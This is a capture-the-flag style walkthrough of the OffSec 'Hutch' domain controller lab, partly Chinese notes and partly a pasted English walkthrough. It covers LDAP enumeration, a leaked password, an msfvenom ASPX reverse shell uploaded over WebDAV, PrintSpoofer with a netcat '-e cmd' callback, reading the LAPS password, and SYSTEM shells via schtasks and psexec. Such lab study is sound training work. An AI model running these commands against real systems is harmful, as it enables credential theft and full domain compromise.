|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Cert Publishers
|         description: Members of this group are permitted to publish certificates to the directory
|         distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12342
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         uSNChanged: 12344
|         name: Cert Publishers
|         objectGUID: df7594ea-e87f-bf40-8148-c9d1a63ca68c
|         objectSid: 1-5-21-2216925765-458455009-2806096489-517
|         sAMAccountName: Cert Publishers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Users
|         description: All domain users
|         distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12348
|         memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 12350
|         name: Domain Users
|         objectGUID: 2803cd3-fced-d543-8a4-a6dfd0de8541
|         objectSid: 1-5-21-2216925765-458455009-2806096489-513
|         sAMAccountName: Domain Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Guests
|         description: All domain guests
|         distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12351
|         memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 12353
|         name: Domain Guests
|         objectGUID: ba7583f0-90f-94a-8525-51adcc21367b
|         objectSid: 1-5-21-2216925765-458455009-2806096489-514
|         sAMAccountName: Domain Guests
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Group Policy Creator Owners
|         description: Members in this group can modify group policy for the domain
|         member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
|         distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12354
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         uSNChanged: 12391
|         name: Group Policy Creator Owners
|         objectGUID: 20f62f8-c24-a64f-9191-289c1149958
|         objectSid: 1-5-21-2216925765-458455009-2806096489-520
|         sAMAccountName: Group Policy Creator Owners
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: RAS and IAS Servers
|         description: Servers in this group can access remote access properties of users
|         distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12357
|         uSNChanged: 12359
|         name: RAS and IAS Servers
|         objectGUID: 76c688f-de10-7e4d-8cd1-7327f0532256
|         objectSid: 1-5-21-2216925765-458455009-2806096489-553
|         sAMAccountName: RAS and IAS Servers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 71f24ae4-97-a34d-a932-d7fc7124d21
|         objectSid: 1-5-21-2216925765-458455009-2806096489-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 1e2a4623-2fb7-e14f-b2ac-f2b2f232fb60
|         objectSid: 1-5-21-2216925765-458455009-2806096489-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers
|         objectGUID: 42844bc6-c387-f947-a4be-989c3580f2ab
|         objectSid: 1-5-21-2216925765-458455009-2806096489-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|
|
|_Result limited to 20 objects (see ldap.maxobjects)
3269/tcp open  tcpwrapped
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.49 seconds
```

接著用 domain name 來執行 ldapsearch **DC=hutch,DC=offsec**

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ ldapsearch -x -H ldap://192.168.171.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep AccountName
sAMAccountName: Guest
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
sAMAccountName: fmcsorley

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ ldapsearch -x -H ldap://192.168.171.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
```

看到最後一行有個 CrabSharkJellyfish192 密碼，從 accountname 最後一個比對猜測是 fmcsorley 的密碼

用 crackmapexec smb 驗證

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ crackmapexec smb 192.168.171.122 -u fmcsorley -p 'CrabSharkJellyfish192'
SMB         192.168.171.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.171.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

確認帳密沒錯

用 nmap & nikto 可以看到 80 port 有跑 webdav

現在有 credential 且有 webdav，嘗試用 cadaver 連接 [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ cadaver 192.168.171.122
Authentication required for 192.168.171.122 on server `192.168.171.122':
Username: fmcsorley
Password:
dav:/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/> pwd
Current collection is `http://192.168.171.122/'.
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  11月  4  2020
        iisstart.htm                         703  11月  4  2020
        iisstart.png                       99710  11月  4  2020
        index.aspx                          1241  11月  5  2020
dav:/>
```

嘗試上傳 reverse shell

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=4444 -f aspx -o shell.aspx
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3429 bytes
Saved as: shell.aspx
```

```json
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  11月  4  2020
        iisstart.htm                         703  11月  4  2020
        iisstart.png                       99710  11月  4  2020
        index.aspx                          1241  11月  5  2020
dav:/> put shell.aspx
Uploading shell.aspx to `/shell.aspx':
Progress: [=============================>] 100.0% of 3429 bytes succeeded.
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  11月  4  2020
        iisstart.htm                         703  11月  4  2020
        iisstart.png                       99710  11月  4  2020
        index.aspx                          1241  11月  5  2020
        shell.aspx                          3429   8月 31 23:06
```

接著用 web 呼叫

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.171.122] 50549
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

get shell!

發現其權限有 SeImpersonatePrivilege，且為 win2019，嘗試利用 printspoofer 提權

```json
c:\Users\Public\Downloads>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

將檔案上傳到 C:\\Users\\Public\\Downloads 後執行

```json
c:\Users\Public\Downloads>.\PrintSpoofer64.exe -c ".\nc.exe 192.168.45.217 80 -e cmd"
.\PrintSpoofer64.exe -c ".\nc.exe 192.168.45.217 80 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

成功提權！

```json
┌──(ouyang㉿kali)-[/usr/share/windows-binaries]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.171.122] 50588
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Escalation

### Microsoft LAPS

Next, we'll escalate our privileges. The contents of the **C:\Program Files\** directory indicate that Microsoft's _Local Administrator Password Solution (LAPS)_ may be installed.

```
c:\windows\system32\inetsrv>dir "C:\Program Files"
dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 0A26-9DC1

 Directory of C:\Program Files

11/03/2020  09:59 PM    <DIR>          .
11/03/2020  09:59 PM    <DIR>          ..
11/04/2020  04:08 AM    <DIR>          Common Files
11/03/2020  08:34 PM    <DIR>          internet explorer
11/03/2020  09:59 PM    <DIR>          LAPS
11/03/2020  09:37 PM    <DIR>          MSBuild
11/03/2020  09:37 PM    <DIR>          Reference Assemblies
11/04/2020  04:08 AM    <DIR>          VMware
11/03/2020  08:39 PM    <DIR>          Windows Defender
11/03/2020  09:02 PM    <DIR>          Windows Defender Advanced Threat Protection
09/14/2018  11:19 PM    <DIR>          Windows Mail
11/03/2020  08:34 PM    <DIR>          Windows Media Player
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform
09/14/2018  11:28 PM    <DIR>          windows nt
11/03/2020  08:34 PM    <DIR>          Windows Photo Viewer
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices
09/14/2018  11:19 PM    <DIR>          Windows Security
09/14/2018  11:19 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              18 Dir(s)  12,207,812,608 bytes free
```

LAPS is a tool that periodically changes the local administrator's password when it expires. It then stores the password details in the Active Directory. Using the credentials we have already found (`fmcsorley:CrabSharkJellyfish192`), let's attempt to query LDAP for the local administrator password.

```
kali@kali:~$ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H laps://192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldap_initialize( ldap://192.168.120.108 )
filter: (ms-MCS-AdmPwd=*)
requesting: ms-MCS-AdmPwd 
# extended LDIF
#
# LDAPv3
# base <DC=hutch,DC=offsec> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: T4E@d8!/od@l36

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Luckily, we discover a password (`T4E@d8!/od@l36`) for `ms-Mcs-AdmPwd`. Note that because of LAPS, this password will be different in your environment.

From here we can escalate to an administrative shell by creating a new scheduled task that will re-execute our reverse shell payload with `SYSTEM` level integrity. We'll use the target's enumerated LDAP Common Name (`HUTCHDC`) in the creation of the scheduled task.

First, let's restart out Netcat listener.

```
kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
```

Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.

```
c:\windows\system32\inetsrv>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task "shell" has successfully been created.
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
SUCCESS: Attempted to run the scheduled task "shell".
PS C:\windows\system32\inetsrv>
```

Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.

```
kali@kali:~$ nc -lvp 445
listening on [any] 445 ...
192.168.120.108: inverse host lookup failed: Unknown host
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731
Microsoft Windows [Version 10.0.17763.1554]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Close

---

用 LAPS 拿到密碼後，也可以直接用 psexec 登入 administrator (密碼有特殊字元，記得加引號)(帳號不是用反斜線，用一般斜線就好)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ impacket-psexec hutch.offsec/Administrator:"w8&WEw@Q8K,LXQ"@192.168.171.122
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.171.122.....
[*] Found writable share ADMIN$
[*] Uploading file oYGGgUuD.exe
[*] Opening SVCManager on 192.168.171.122.....
[*] Creating service OEmJ on 192.168.171.122.....
[*] Starting service OEmJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

